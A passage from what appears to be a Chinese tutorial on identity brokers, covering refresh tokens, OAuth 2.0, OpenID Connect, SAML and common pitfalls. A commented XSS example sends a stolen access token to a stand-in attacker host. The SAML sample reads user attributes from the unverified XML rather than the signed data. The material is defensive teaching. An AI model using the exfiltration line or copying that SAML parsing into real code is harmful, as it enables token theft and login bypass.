+<p><strong>性能开销</strong></p>
+<ul>
+<li>每个请求都需要数据库查找</li>
+<li>到会话存储的网络延迟</li>
+<li>身份代理的负载更高</li>
+<li>大规模时的潜在瓶颈</li>
+</ul>
+<p><strong>分布式系统挑战</strong></p>
+<ul>
+<li>微服务必须调用代理进行验证</li>
+<li>每个请求的网络依赖</li>
+<li>服务链中的延迟增加</li>
+<li>代理成为关键依赖</li>
+</ul>
+</div></div>
+<h3 id="混合方法：短期令牌与刷新令牌">混合方法：短期令牌与刷新令牌</h3>
+<p>许多现代系统使用混合方法，结合两者的优势：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 使用访问令牌和刷新令牌的混合身份验证</span>
+<span class="token keyword">class</span> <span class="token class-name">HybridAuthBroker</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key
+        self<span class="token punctuation">.</span>refresh_tokens <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 服务器端刷新令牌存储</span>
+    
+    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># 短期访问令牌（15 分钟）</span>
+            access_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
+                <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'access'</span>
+            <span class="token punctuation">}</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
+            
+            <span class="token comment"># 长期刷新令牌（7 天）存储在服务器端</span>
+            refresh_token <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">[</span>refresh_token<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'expires'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+            
+            <span class="token keyword">return</span> <span class="token punctuation">{</span>
+                <span class="token string">'access_token'</span><span class="token punctuation">:</span> access_token<span class="token punctuation">,</span>
+                <span class="token string">'refresh_token'</span><span class="token punctuation">:</span> refresh_token<span class="token punctuation">,</span>
+                <span class="token string">'expires_in'</span><span class="token punctuation">:</span> <span class="token number">900</span>  <span class="token comment"># 15 分钟</span>
+            <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">refresh_access_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> refresh_token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 验证刷新令牌（服务器端检查）</span>
+        token_data <span class="token operator">=</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">.</span>get<span class="token punctuation">(</span>refresh_token<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> token_data <span class="token keyword">and</span> token_data<span class="token punctuation">[</span><span class="token string">'expires'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># 颁发新的访问令牌</span>
+            access_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span>
+                <span class="token string">'sub'</span><span class="token punctuation">:</span> token_data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>minutes<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'type'</span><span class="token punctuation">:</span> <span class="token string">'access'</span>
+            <span class="token punctuation">}</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> access_token
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> refresh_token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 撤销刷新令牌</span>
+        <span class="token keyword">if</span> refresh_token <span class="token keyword">in</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">:</span>
+            <span class="token keyword">del</span> self<span class="token punctuation">.</span>refresh_tokens<span class="token punctuation">[</span>refresh_token<span class="token punctuation">]</span></code></pre>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🎯 混合方法的优势</p><div class="admonition-content"><p><strong>平衡的安全性</strong></p>
+<ul>
+<li>短期访问令牌限制暴露窗口</li>
+<li>被泄露的访问令牌很快过期</li>
+<li>刷新令牌可以立即撤销</li>
+<li>注销使刷新令牌失效</li>
+</ul>
+<p><strong>性能和可扩展性</strong></p>
+<ul>
+<li>访问令牌本地验证（无状态）</li>
+<li>刷新令牌检查不频繁（每 15 分钟）</li>
+<li>降低身份代理的负载</li>
+<li>像基于令牌的身份验证一样可扩展</li>
+</ul>
+<p><strong>用户体验</strong></p>
+<ul>
+<li>在后台无缝刷新令牌</li>
+<li>无需频繁重新身份验证</li>
+<li>注销立即生效</li>
+<li>安全性和便利性之间的平衡</li>
+</ul>
+</div></div>
+<p>这种混合方法被 OAuth 2.0 和 OpenID Connect 使用，代表了行业最佳实践。</p>
+<h2 id="协议选择：OAuth-2-0、SAML-和-OpenID-Connect">协议选择：OAuth 2.0、SAML 和 OpenID Connect</h2>
+<p>身份代理必须支持各种身份验证协议。理解它们的差异对于实现决策至关重要。</p>
+<h3 id="OAuth-2-0：授权框架">OAuth 2.0：授权框架</h3>
+<p>OAuth 2.0 是一个授权框架，而不是身份验证协议，尽管经常用于两者：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># OAuth 2.0 授权码流程</span>
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect
+<span class="token keyword">import</span> requests
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+BROKER_AUTH_URL <span class="token operator">=</span> <span class="token string">'https://broker.example.com/oauth/authorize'</span>
+BROKER_TOKEN_URL <span class="token operator">=</span> <span class="token string">'https://broker.example.com/oauth/token'</span>
+CLIENT_ID <span class="token operator">=</span> <span class="token string">'your_client_id'</span>
+CLIENT_SECRET <span class="token operator">=</span> <span class="token string">'your_client_secret'</span>
+REDIRECT_URI <span class="token operator">=</span> <span class="token string">'https://app.example.com/callback'</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 将用户重定向到身份代理</span>
+    auth_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_AUTH_URL<span class="token punctuation">}</span></span><span class="token string">?client_id=</span><span class="token interpolation"><span class="token punctuation">{</span>CLIENT_ID<span class="token punctuation">}</span></span><span class="token string">&amp;redirect_uri=</span><span class="token interpolation"><span class="token punctuation">{</span>REDIRECT_URI<span class="token punctuation">}</span></span><span class="token string">&amp;response_type=code&amp;scope=openid profile email"</span></span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>auth_url<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/callback'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 代理使用授权码重定向回来</span>
+    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 用授权码交换访问令牌</span>
+    token_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>BROKER_TOKEN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">'grant_type'</span><span class="token punctuation">:</span> <span class="token string">'authorization_code'</span><span class="token punctuation">,</span>
+        <span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>
+        <span class="token string">'redirect_uri'</span><span class="token punctuation">:</span> REDIRECT_URI<span class="token punctuation">,</span>
+        <span class="token string">'client_id'</span><span class="token punctuation">:</span> CLIENT_ID<span class="token punctuation">,</span>
+        <span class="token string">'client_secret'</span><span class="token punctuation">:</span> CLIENT_SECRET
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    tokens <span class="token operator">=</span> token_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    access_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span>
+    
+    <span class="token comment"># 使用访问令牌获取用户信息</span>
+    user_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>
+        <span class="token string">'https://broker.example.com/userinfo'</span><span class="token punctuation">,</span>
+        headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>access_token<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">}</span>
+    <span class="token punctuation">)</span>
+    
+    user_info <span class="token operator">=</span> user_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token comment"># 使用 user_info 创建应用程序会话</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"欢迎 </span><span class="token interpolation"><span class="token punctuation">{</span>user_info<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span></code></pre>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>📋 OAuth 2.0 特征</p><div class="admonition-content"><p><strong>设计用于</strong></p>
+<ul>
+<li>委托授权</li>
+<li>第三方 API 访问</li>
+<li>移动和 Web 应用程序</li>
+<li>现代 REST API</li>
+</ul>
+<p><strong>优势</strong></p>
+<ul>
+<li>简单的基于 HTTP 的协议</li>
+<li>广泛的行业采用</li>
+<li>移动友好</li>
+<li>灵活的授权类型</li>
+</ul>
+<p><strong>局限性</strong></p>
+<ul>
+<li>不是为身份验证设计的</li>
+<li>没有标准的用户信息格式</li>
+<li>需要额外的配置文件端点</li>
+<li>令牌格式未标准化</li>
+</ul>
+</div></div>
+<h3 id="OpenID-Connect：OAuth-2-0-之上的身份验证层">OpenID Connect：OAuth 2.0 之上的身份验证层</h3>
+<p>OpenID Connect（OIDC）专门为身份验证扩展了 OAuth 2.0：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># OpenID Connect 在 OAuth 2.0 流程中添加 ID 令牌</span>
+<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/oidc-callback'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">oidc_callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span>
+    
+    <span class="token comment"># 用授权码交换令牌</span>
+    token_response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>BROKER_TOKEN_URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
+        <span class="token string">'grant_type'</span><span class="token punctuation">:</span> <span class="token string">'authorization_code'</span><span class="token punctuation">,</span>
+        <span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">,</span>
+        <span class="token string">'redirect_uri'</span><span class="token punctuation">:</span> REDIRECT_URI<span class="token punctuation">,</span>
+        <span class="token string">'client_id'</span><span class="token punctuation">:</span> CLIENT_ID<span class="token punctuation">,</span>
+        <span class="token string">'client_secret'</span><span class="token punctuation">:</span> CLIENT_SECRET
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    tokens <span class="token operator">=</span> token_response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    id_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'id_token'</span><span class="token punctuation">]</span>  <span class="token comment"># OIDC 添加 ID 令牌</span>
+    access_token <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span>
+    
+    <span class="token comment"># 验证和解码 ID 令牌</span>
+    <span class="token comment"># ID 令牌包含用户身份声明</span>
+    user_claims <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>
+        id_token<span class="token punctuation">,</span>
+        key<span class="token operator">=</span>get_broker_public_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+        algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'RS256'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        audience<span class="token operator">=</span>CLIENT_ID
+    <span class="token punctuation">)</span>
+    
+    <span class="token comment"># ID 令牌包含：sub、name、email 等</span>
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"欢迎 </span><span class="token interpolation"><span class="token punctuation">{</span>user_claims<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string"> (</span><span class="token interpolation"><span class="token punctuation">{</span>user_claims<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">)"</span></span></code></pre>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ OpenID Connect 优势</p><div class="admonition-content"><p><strong>专为身份验证而构建</strong></p>
+<ul>
+<li>ID 令牌包含用户身份</li>
+<li>标准化的用户声明</li>
+<li>不需要额外的配置文件端点</li>
+<li>清晰的身份验证语义</li>
+</ul>
+<p><strong>安全功能</strong></p>
+<ul>
+<li>ID 令牌是签名的 JWT</li>
+<li>加密验证</li>
+<li>受众和颁发者验证</li>
+<li>用于重放保护的 nonce</li>
+</ul>
+<p><strong>行业标准</strong></p>
+<ul>
+<li>所有主要身份提供者都支持</li>
+<li>广泛的库支持</li>
+<li>文档完善的规范</li>
+<li>积极的开发和更新</li>
+</ul>
+</div></div>
+<h3 id="SAML-2-0：企业标准">SAML 2.0：企业标准</h3>
+<p>SAML（安全断言标记语言）是传统的企业身份验证协议：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># SAML 2.0 身份验证流程（简化）</span>
+<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree
+<span class="token keyword">from</span> signxml <span class="token keyword">import</span> XMLVerifier
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/saml/login'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">saml_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 生成 SAML 身份验证请求</span>
+    saml_request <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
+    &lt;samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                        ID="</span><span class="token interpolation"><span class="token punctuation">{</span>generate_request_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"
+                        Version="2.0"
+                        IssueInstant="</span><span class="token interpolation"><span class="token punctuation">{</span>datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isoformat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">Z"
+                        Destination="</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_SSO_URL<span class="token punctuation">}</span></span><span class="token string">"&gt;
+        &lt;saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"&gt;
+            </span><span class="token interpolation"><span class="token punctuation">{</span>SERVICE_PROVIDER_ID<span class="token punctuation">}</span></span><span class="token string">
+        &lt;/saml:Issuer&gt;
+    &lt;/samlp:AuthnRequest&gt;
+    """</span></span>
+    
+    <span class="token comment"># 编码并重定向到身份代理</span>
+    encoded_request <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>saml_request<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sso_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>BROKER_SSO_URL<span class="token punctuation">}</span></span><span class="token string">?SAMLRequest=</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_request<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>sso_url<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/saml/acs'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">saml_assertion_consumer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 代理将 SAML 响应发送回来</span>
+    saml_response <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'SAMLResponse'</span><span class="token punctuation">]</span>
+    decoded_response <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>saml_response<span class="token punctuation">)</span>
+    
+    <span class="token comment"># 验证 SAML 断言签名</span>
+    xml_doc <span class="token operator">=</span> etree<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>decoded_response<span class="token punctuation">)</span>
+    verified_data <span class="token operator">=</span> XMLVerifier<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>
+        xml_doc<span class="token punctuation">,</span>
+        x509_cert<span class="token operator">=</span>get_broker_certificate<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">)</span><span class="token punctuation">.</span>signed_xml
+    
+    <span class="token comment"># 从断言中提取用户属性</span>
+    nameid <span class="token operator">=</span> xml_doc<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    attributes <span class="token operator">=</span> extract_saml_attributes<span class="token punctuation">(</span>xml_doc<span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"欢迎 </span><span class="token interpolation"><span class="token punctuation">{</span>attributes<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span></code></pre>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🏢 SAML 特征</p><div class="admonition-content"><p><strong>设计用于</strong></p>
+<ul>
+<li>企业单点登录</li>
+<li>组织之间的联合</li>
+<li>传统企业系统</li>
+<li>强安全要求</li>
+</ul>
+<p><strong>优势</strong></p>
+<ul>
+<li>成熟且经过实战检验</li>
+<li>丰富的属性交换</li>
+<li>强大的安全功能</li>
+<li>企业采用</li>
+</ul>
+<p><strong>劣势</strong></p>
+<ul>
+<li>基于 XML（冗长且复杂）</li>
+<li>不适合移动设备</li>
+<li>学习曲线陡峭</li>
+<li>现代工具有限</li>
+</ul>
+</div></div>
+<h3 id="协议选择指南">协议选择指南</h3>
+<div class="admonition tip"><p class="admonition-title"><span class="mdi mdi-lightbulb-on-outline admonition-icon"></span>🎯 选择正确的协议</p><div class="admonition-content"><p><strong>使用 OpenID Connect 当：</strong></p>
+<ul>
+<li>构建新应用程序</li>
+<li>需要移动支持</li>
+<li>想要现代 REST API</li>
+<li>需要简单集成</li>
+<li>面向消费者用户</li>
+</ul>
+<p><strong>使用 SAML 当：</strong></p>
+<ul>
+<li>与企业系统集成</li>
+<li>企业 IT 策略要求</li>
+<li>需要丰富的属性交换</li>
+<li>与其他组织联合</li>
+<li>需要传统系统兼容性</li>
+</ul>
+<p><strong>使用 OAuth 2.0 当：</strong></p>
+<ul>
+<li>需要 API 授权（不是身份验证）</li>
+<li>第三方访问资源</li>
+<li>委托权限</li>
+<li>与 OIDC 结合用于身份验证</li>
+</ul>
+</div></div>
+<p>像 Keycloak 这样的现代身份代理支持所有三种协议，允许应用程序根据需要进行选择。</p>
+<h2 id="常见陷阱和安全问题">常见陷阱和安全问题</h2>
+<p>身份代理实现经常遭受常见的安全漏洞和设计错误。</p>
+<h3 id="陷阱-1：在本地存储中存储令牌">陷阱 1：在本地存储中存储令牌</h3>
+<p>许多应用程序将令牌存储在浏览器本地存储中，从而产生 XSS 漏洞：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ❌ 不安全：在本地存储中存储令牌</span>
+<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+        <span class="token comment">// 容易受到 XSS 攻击</span>
+        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'access_token'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>access_token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'refresh_token'</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>refresh_token<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// 任何 XSS 漏洞都可以窃取令牌</span>
+<span class="token comment">// &lt;script&gt;</span>
+<span class="token comment">//   fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));</span>
+<span class="token comment">// &lt;/script&gt;</span></code></pre>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 本地存储漏洞</p><div class="admonition-content"><p><strong>XSS 攻击向量</strong></p>
+<ul>
+<li>JavaScript 可以访问本地存储</li>
+<li>任何 XSS 漏洞都会暴露令牌</li>
+<li>第三方脚本可以窃取令牌</li>
+<li>没有针对脚本注入的保护</li>
+</ul>
+<p><strong>影响</strong></p>
+<ul>
+<li>完全账户接管</li>
+<li>令牌在过期前有效</li>
+<li>攻击者可以冒充用户</li>
+<li>难以检测盗窃</li>
+</ul>
+</div></div>
+<p>使用 HTTP-only cookie 的更好方法：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// ✅ 安全：使用 HTTP-only cookie</span>
+<span class="token comment">// 服务器设置 HTTP-only cookie（JavaScript 无法访问）</span>
+@app<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+def <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span>
+    data <span class="token operator">=</span> request<span class="token punctuation">.</span>json
+    tokens <span class="token operator">=</span> broker<span class="token punctuation">.</span><span class="token function">authenticate</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    
+    response <span class="token operator">=</span> <span class="token function">make_response</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string-property property">'status'</span><span class="token operator">:</span> <span class="token string">'success'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    
+    # <span class="token constant">HTTP</span><span class="token operator">-</span>only cookie 防止 JavaScript 访问
+    response<span class="token punctuation">.</span><span class="token function">set_cookie</span><span class="token punctuation">(</span>
+        <span class="token string">'access_token'</span><span class="token punctuation">,</span>
+        tokens<span class="token punctuation">[</span><span class="token string">'access_token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        httponly<span class="token operator">=</span>True<span class="token punctuation">,</span>  # 防止 JavaScript 访问
+        secure<span class="token operator">=</span>True<span class="token punctuation">,</span>    # 仅 <span class="token constant">HTTPS</span>
+        samesite<span class="token operator">=</span><span class="token string">'Strict'</span>  # <span class="token constant">CSRF</span> 保护
+    <span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> response
+
+<span class="token comment">// 客户端：不需要令牌处理</span>
+<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/api/login'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">credentials</span><span class="token operator">:</span> <span class="token string">'include'</span><span class="token punctuation">,</span>  <span class="token comment">// 发送 cookie</span>
+        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token punctuation">,</span> password <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h3 id="陷阱-2：缺少令牌验证">陷阱 2：缺少令牌验证</h3>
+<p>应用程序有时会跳过适当的令牌验证：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># ❌ 不安全：信任令牌而不验证</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/user'</span><span class="token punctuation">)</span>
